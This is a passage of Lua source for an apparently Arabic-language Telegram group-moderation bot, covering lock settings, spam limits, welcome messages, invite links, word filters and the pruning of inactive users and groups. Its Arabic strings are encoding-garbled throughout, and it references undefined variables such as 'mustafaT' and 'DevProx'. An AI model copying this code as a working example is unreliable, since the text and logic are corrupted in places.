Devmfm:set(mustafa..'mfm:Lock:FarsiBan'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ Ψ¨Ψ§ΩΨ·Ψ±Ψ― Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩΩ* ', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ" or LockText[2] == "Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ Ψ¨Ψ§ΩΨ­Ψ°Ω" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ Ψ¨Ψ§ΩΨ­Ψ°Ω*")  
Devmfm:set(mustafa.."mfm:Lock:Bots"..msg.chat_id_,"del")  
end
if LockText[2] == "Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ Ψ¨Ψ§ΩΨ·Ψ±Ψ―*")  
Devmfm:set(mustafa.."mfm:Lock:Bots"..msg.chat_id_,"kick")  
end
if LockText[2] == "Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ Ψ¨Ψ§ΩΨͺΩΩΩΨ―" or LockText[2] == "Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ Ψ¨Ψ§ΩΨͺΩΩΨ―" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ Ψ¨Ψ§ΩΨͺΩΩΨ―*")  
Devmfm:set(mustafa.."mfm:Lock:Bots"..msg.chat_id_,"ked")  
end
if LockText[2] == "Ψ§ΩΨͺΩΨ±Ψ§Ψ±" or LockText[2] == "Ψ§ΩΨͺΩΨ±Ψ§Ψ± Ψ¨Ψ§ΩΨ­Ψ°Ω" then 
Devmfm:hset(mustafa.."mfm:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ± Ψ¨Ψ§ΩΨ­Ψ°Ω*")  
end
if LockText[2] == "Ψ§ΩΨͺΩΨ±Ψ§Ψ± Ψ¨Ψ§ΩΨ·Ψ±Ψ―" then 
Devmfm:hset(mustafa.."mfm:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ± Ψ¨Ψ§ΩΨ·Ψ±Ψ―*")  
end
if LockText[2] == "Ψ§ΩΨͺΩΨ±Ψ§Ψ± Ψ¨Ψ§ΩΨͺΩΩΨ―" or LockText[2] == "Ψ§ΩΨͺΩΨ±Ψ§Ψ± Ψ¨Ψ§ΩΨͺΩΩΩΨ―" then 
Devmfm:hset(mustafa.."mfm:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ± Ψ¨Ψ§ΩΨͺΩΩΨ―*")  
end
if LockText[2] == "Ψ§ΩΨͺΩΨ±Ψ§Ψ± Ψ¨Ψ§ΩΩΨͺΩ" then 
Devmfm:hset(mustafa.."mfm:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ± Ψ¨Ψ§ΩΩΨͺΩ*")  
end
if BasicConstructor(msg) then
if LockText[2] == "Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ" then
if not Devmfm:get(mustafa..'mfm:Lock:Pin'..msg.chat_id_) then
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  Devmfm:set(mustafa.."mfm:PinnedMsg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ*")  
Devmfm:set(mustafa..'mfm:Lock:Pin'..msg.chat_id_,true)
Devmfm:sadd(mustafa.."mfm:Lock:Pinpin",msg.chat_id_) 
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
end end end
end
end
end
--     Source Escobar     --
if Admin(msg) then
if text and (text:match("^ΨΆΨΉ ΨͺΩΨ±Ψ§Ψ± (%d+)$") or text:match("^ΩΨΆΨΉ ΨͺΩΨ±Ψ§Ψ± (%d+)$")) then   
local TextSpam = text:match("ΨΆΨΉ ΨͺΩΨ±Ψ§Ψ± (%d+)$") or text:match("ΩΨΆΨΉ ΨͺΩΨ±Ψ§Ψ± (%d+)$")
if tonumber(TextSpam) < 2 then
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΩΩ Ψ¨ΨͺΨ­Ψ―ΩΨ― ΨΉΨ―Ψ― Ψ§ΩΨ¨Ψ± ΩΩ 2 ΩΩΨͺΩΨ±Ψ§Ψ±*', 1, 'md')
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΨͺΩΩΩΩ ΩΨΆΨΉ ΨΉΨ―Ψ― Ψ§ΩΨͺΩΨ±Ψ§Ψ± β * '..TextSpam, 1, 'md')
Devmfm:hset(mustafa.."mfm:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,TextSpam) 
end
end
if text and (text:match("^ΨΆΨΉ Ψ²ΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ± (%d+)$") or text:match("^ΩΨΆΨΉ Ψ²ΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ± (%d+)$")) then  
local TextSpam = text:match("ΨΆΨΉ Ψ²ΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ± (%d+)$") or text:match("ΩΨΆΨΉ Ψ²ΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ± (%d+)$")
Devmfm:hset(mustafa.."mfm:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,TextSpam) 
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΨͺΩΩΩΩ ΩΨΆΨΉ Ψ²ΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ± β * '..TextSpam, 1, 'md')
end
--     Source Escobar     --
if Manager(msg) then
if text and text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Id:Photo'..msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω Ψ¨Ψ§ΩΨͺΨ§ΩΩΨ― ΩΩΨΉΩ', 1, 'md')
else
local mustafaTEAM = '*β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β* '..mfmRank(msg)..' \n*β β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω*'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Lock:Id:Photo'..msg.chat_id_)
end end
if text and text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω' and ChCheck(msg) then
if Devmfm:get(mustafa..'mfm:Lock:Id:Photo'..msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω Ψ¨Ψ§ΩΨͺΨ§ΩΩΨ― ΩΩΨΉΩΨ·Ω*', 1, 'md')
else
local mustafaTEAM = '*β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β * '..mfmRank(msg)..' \n*β β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω*'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Lock:Id:Photo'..msg.chat_id_,true)
end end 

if text and text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Id'..msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨͺΨ§ΩΩΨ― ΩΩΨΉΩ ', 1, 'md')
else
local mustafaTEAM = '*β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β * '..mfmRank(msg)..' \n*β β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨ΩΨ¬Ψ§Ψ­*'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Lock:Id'..msg.chat_id_)
end end 
if text and text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω' and ChCheck(msg) then
if Devmfm:get(mustafa..'mfm:Lock:Id'..msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨͺΨ§ΩΩΨ― ΩΩΨΉΩΨ·Ω* ', 1, 'md')
else
local mustafaTEAM = '*β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β * '..mfmRank(msg)..' \n*β β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨ΩΨ¬Ψ§Ψ­*'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Lock:Id'..msg.chat_id_,true)
end end
end
--     Source Escobar     --
if text == 'ΨΆΨΉ Ψ±Ψ§Ψ¨Ψ·' or text == 'ΩΨΆΨΉ Ψ±Ψ§Ψ¨Ψ·' or text == 'ΨΆΨΉ Ψ§ΩΨ±Ψ§Ψ¨Ψ·' or text == 'ΩΨΆΨΉ Ψ§ΩΨ±Ψ§Ψ¨Ψ·' then
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω Ψ±Ψ§Ψ¨Ψ· Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© Ψ§Ω Ψ±Ψ§Ψ¨Ψ· ΩΩΨ§Ψ© Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
Devmfm:setex(mustafa.."mfm:Set:Groups:Links"..msg.chat_id_..""..msg.sender_user_id_,300,true) 
end
if text == 'Ψ§ΩΨ΄Ψ§Ψ‘ Ψ±Ψ§Ψ¨Ψ·' or text == 'Ψ§ΩΨ΄Ψ§Ψ‘ Ψ§ΩΨ±Ψ§Ψ¨Ψ·' then
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if not Devmfm:get(mustafa.."mfm:Groups:Links"..msg.chat_id_)  then 
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
Devmfm:set(mustafa.."mfm:Groups:Links"..msg.chat_id_,LinkGroup) 
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΨͺΩΩΩΩ Ψ§ΩΨ΄Ψ§Ψ‘ Ψ±Ψ§Ψ¨Ψ· Ψ¬Ψ―ΩΨ― Ψ’Ωΰ’ͺΨ³Ϋ§Ω β Ψ§ΩΨ±Ψ§Ψ¨Ψ·*', 1, 'md')
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΩΩΨ³Ψͺ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ―ΨΉΩΨ© Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ ΨΉΨ¨Ψ± Ψ§ΩΨ±Ψ§Ψ¨Ψ· ΩΨ±Ψ¬Ω Ψ§ΩΨͺΨ­ΩΩ ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ*', 1, 'md')
end
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω Ψ±Ψ§Ψ¨Ψ· Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© Ψ§Ω Ψ±Ψ§Ψ¨Ψ· ΩΩΨ§Ψ© Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
Devmfm:setex(mustafa.."mfm:Set:Groups:Links"..msg.chat_id_..""..msg.sender_user_id_,300,true) 
end
end
end
--     Source Escobar     --
if Admin(msg) then
if text and text:match("^ΨͺΩΨΉΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨$") and ChCheck(msg) then
local mustafaTEAM = '*β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β * '..mfmRank(msg)..' \n*β β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨ Ψ¨ΩΨ¬Ψ§Ψ­*'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa.."mfm:Lock:Welcome"..msg.chat_id_,true)
end
if text and text:match("^ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨$") and ChCheck(msg) then
local mustafaTEAM = '*β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β * '..mfmRank(msg)..' \n*β β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨ Ψ¨ΩΨ¬Ψ§Ψ­*'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa.."mfm:Lock:Welcome"..msg.chat_id_)
end
if Devmfm:get(mustafa..'mfm:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'Ψ§ΩΨΊΨ§Ψ‘' then 
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΩΨΈ ΩΩΩΨ΄Ψ© Ψ§ΩΨͺΨ±Ψ­ΩΨ¨*', 1, 'md')
Devmfm:del(mustafa..'mfm:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
Devmfm:del(mustafa..'mfm:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
Devmfm:set(mustafa..'mfm:Groups:Welcomes'..msg.chat_id_,text)
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΨͺΩΩΩΩ Ψ­ΩΨΈ ΩΩΩΨ΄Ψ© Ψ§ΩΨͺΨ±Ψ­ΩΨ¨*', 1, 'md')
return false   
end
if text and text:match("^ΨΆΨΉ ΨͺΨ±Ψ­ΩΨ¨$") and ChCheck(msg) or text and text:match("^ΩΨΆΨΉ ΨͺΨ±Ψ­ΩΨ¨$") and ChCheck(msg) or text and text:match("^Ψ§ΨΆΩ ΨͺΨ±Ψ­ΩΨ¨$") and ChCheck(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨ Ψ§ΩΨ§Ω *\n*β β« ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ Ψ§ΨΆΨ§ΩΨ© ΩΨ§ΩΩΩ β β₯‘ *\n *β β« Ψ―Ψ§ΩΨ© ΨΉΨ±ΨΆ Ψ§ΩΨ§Ψ³Ω β firstname *\n*β β« Ψ―Ψ§ΩΨ© ΨΉΨ±ΨΆ Ψ§ΩΩΨΉΨ±Ω β username *', 1, 'md')
Devmfm:set(mustafa..'mfm:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
if text and text:match("^Ψ­Ψ°Ω Ψ§ΩΨͺΨ±Ψ­ΩΨ¨$") and ChCheck(msg) or text and text:match("^Ψ­Ψ°Ω ΨͺΨ±Ψ­ΩΨ¨$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ Ψ­Ψ°Ω Ψ§ΩΨͺΨ±Ψ­ΩΨ¨*")  
Devmfm:del(mustafa..'mfm:Groups:Welcomes'..msg.chat_id_)
end
if text and text:match("^Ψ¬ΩΨ¨ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨$") and ChCheck(msg) or text and text:match("^Ψ¬ΩΨ¨ ΨͺΨ±Ψ­ΩΨ¨$") and ChCheck(msg) or text and text:match("^Ψ§ΩΨͺΨ±Ψ­ΩΨ¨$") and ChCheck(msg) then
local Welcomes = Devmfm:get(mustafaT..'mfm:Groups:Welcomes'..msg.chat_id_)
local Welcomes = Welcomes:gsub('"',"") local Welcomes = Welcomes:gsub("'","") local Welcomes = Welcomes:gsub(",","") local Welcomes = Welcomes:gsub("*","") local Welcomes = Welcomes:gsub(";","") local Welcomes = Welcomes:gsub("`","") local Welcomes = Welcomes:gsub("{","") local Welcomes = Welcomes:gsub("}","") 
if Welcomes then
Dev_mfm(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΩΩ ΩΨͺΩ ΩΨΆΨΉ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨ *\n*β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω β ΨΆΨΉ ΨͺΨ±Ψ­ΩΨ¨ ΩΩΨ­ΩΨΈ* ', 1, 'md')
end
end
--     Source Escobar     --
if Devmfm:get(mustafa..'mfm:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
if text == 'Ψ§ΩΨΊΨ§Ψ‘' then 
Dev_mfm(msg.chat_id_, msg.id_, 1, "*β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΩΨΈ Ψ§ΩΩΨ΅Ω*", 1, 'md')
Devmfm:del(mustafa..'mfm:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
Devmfm:del(mustafa..'mfm:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
https.request('https://api.telegram.org/bot'..TokenBot..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΨͺΩΩΩΩ ΨͺΨΊΩΩΨ± ΩΨ΅Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
return false  
end 
if text and text:match("^ΨΆΨΉ ΩΨ΅Ω$") and ChCheck(msg) or text and text:match("^ΩΨΆΨΉ ΩΨ΅Ω$") and ChCheck(msg) then  
Devmfm:set(mustafa..'mfm:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩ Ψ§ΩΩΨ΅Ω Ψ§ΩΨ§Ω*', 1, 'md')
end
--     Source Escobar     --
if text and text == "ΩΩΨΉ" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_mfm(msg.chat_id_, msg.id_, 1, "*β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩ Ψ§ΩΩΩΩΩ Ψ§ΩΨ§Ω*", 1, 'md') 
Devmfm:set(mustafa.."mfm:SetFilters"..msg.sender_user_id_..msg.chat_id_,"add")  
return false  
end    
if Devmfm:get(mustafa.."mfm:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "add" then
if text == 'Ψ§ΩΨΊΨ§Ψ‘' then 
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ± Ψ§ΩΩΩΨΉ*', 1, 'md')
Devmfm:del(mustafa.."mfm:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
Dev_mfm(msg.chat_id_, msg.id_, 1, "*β β« ΨͺΩΩΩΩ ΩΩΨΉ Ψ§ΩΩΩΩΩ β * "..text, 1, 'html')
Devmfm:del(mustafa.."mfm:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
Devmfm:hset(mustafa..'mfm:Filters:'..msg.chat_id_, text,'newword')
return false
end
if text and text == "Ψ§ΩΨΊΨ§Ψ‘ ΩΩΨΉ" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩ Ψ§ΩΩΩΩΩ Ψ§ΩΨ§Ω", 1, 'md') 
Devmfm:set(mustafa.."mfm:SetFilters"..msg.sender_user_id_..msg.chat_id_,"del")  
return false  
end    
if Devmfm:get(mustafa.."mfm:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "del" then   
if text == 'Ψ§ΩΨΊΨ§Ψ‘' then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ± Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΩΩΨΉ', 1, 'md')
Devmfm:del(mustafa.."mfm:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
if not Devmfm:hget(mustafa..'mfm:Filters:'..msg.chat_id_, text) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ§ΩΩΩΩΩ β "..text.." ΨΊΩΨ± ΩΩΩΩΩΩΜΫΨΉΩ", 1, 'html')
Devmfm:del(mustafa.."mfm:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
else
Devmfm:hdel(mustafa..'mfm:Filters:'..msg.chat_id_, text)
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ§ΩΩΩΩΩ β "..text.." ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ ΩΩΨΉΩΨ§", 1, 'html')
Devmfm:del(mustafa.."mfm:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
end
return false
end
--     Source Escobar     --
if SudoBot(msg) then
if text and text == "Ψ§ΩΨ§Ψ­Ψ΅Ψ§Ψ¦ΩΨ§Ψͺ" and ChCheck(msg) or text and text == "β Ψ§ΩΨ§Ψ­Ψ΅Ψ§Ψ¦ΩΨ§Ψͺ β" then
local gps = Devmfm:scard(mustafa.."mfm:Groups") local users = Devmfm:scard(mustafa.."mfm:Users") 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§Ψ­Ψ΅Ψ§Ψ¦ΩΨ§Ψͺ Ψ§ΩΨ¨ΩΨͺ β β₯‘\nβ β« ΨΉΨ―Ψ― Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ β β¨ '..users..' β©\nβ β« ΨΉΨ―Ψ― Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ β β¨ '..gps..' β©', 1, 'md')
end
if text and text == "Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ" and ChCheck(msg) or text and text == "β Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ β" then
local users = Devmfm:scard(mustafa.."mfm:Users")
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨΉΨ―Ψ― Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ β β¨ '..users..' β©', 1, 'md')
if text and text == "Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ" and ChCheck(msg) or text and text == "β Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ β" then
local gps = Devmfm:scard(DevProx.."mfm:Groups")
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨΉΨ―Ψ― Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ β β¨ '..gps..' β©', 1, 'md')

end
end
--     Source Escobar     --
if text and text:match('^ΨͺΩΨΈΩΩ (%d+)$') and ChCheck(msg) then  
if not Devmfm:get(mustafa..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then  
local Number = tonumber(text:match('^ΨͺΩΨΈΩΩ (%d+)$')) 
if Number > 1000 then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΨ§ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ ΨͺΩΨΈΩΩ Ψ§ΩΨ«Ψ± ΩΩ 1000 Ψ±Ψ³Ψ§ΩΩ', 1, 'md')
return false  
end  
local Message = msg.id_
for i=1,tonumber(Number) do
DeleteMessage(msg.chat_id_,{[0]=Message})
Message = Message - 1048576 
end
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ ΨͺΩΨΈΩΩ *'..Number..'* ΩΩ Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω', 1, 'md')
Devmfm:setex(mustafa..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end 
end
if text == "ΨͺΩΨΈΩΩ Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ" and SecondSudo(msg) and ChCheck(msg) then 
local pv = Devmfm:smembers(mustafa.."mfm:Users")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]
},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
if data.ID and data.ID == "Ok" then
else
Devmfm:srem(mustafa.."mfm:Users",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *ΩΨ§ ΩΩΨ¬Ψ― ΩΨ΄ΨͺΨ±ΩΩΩ ΩΩΩΩΩΩ*', 1, 'md')
else
local ok = #pv - sendok
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨΉΨ―Ψ― Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ Ψ§ΩΨ§Ω β { '..#pv..' }\nβ β« ΨͺΩΩΩΩ Ψ­Ψ°Ω β { '..sendok..' } ΩΩ Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ\nβ β« Ψ§ΩΨΉΨ―Ψ― Ψ§ΩΨ­ΩΩΩΩ Ψ§ΩΨ§Ω  β ( '..ok..' ) \n', 1, 'md')
end
end
end,nil)
end,nil)
end
return false
end
--     Source Escobar     --
if text == "ΨͺΩΨΈΩΩ Ψ§ΩΩΨ±ΩΨ¨Ψ§Ψͺ" and SecondSudo(msg) and ChCheck(msg) or text == "ΨͺΩΨΈΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ" and SecondSudo(msg) and ChCheck(msg) then 
local group = Devmfm:smembers(mustafa.."mfm:Groups")
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
Devmfm:srem(mustafa.."mfm:Groups",group[i]) 
changeChatMemberStatus(group[i], mustafa, "Left")
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
Devmfm:srem(mustafa.."mfm:Groups",group[i]) 
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
Devmfm:srem(mustafa.."mfm:Groups",group[i]) 
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
Devmfm:srem(mustafa.."mfm:Groups",group[i]) 
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
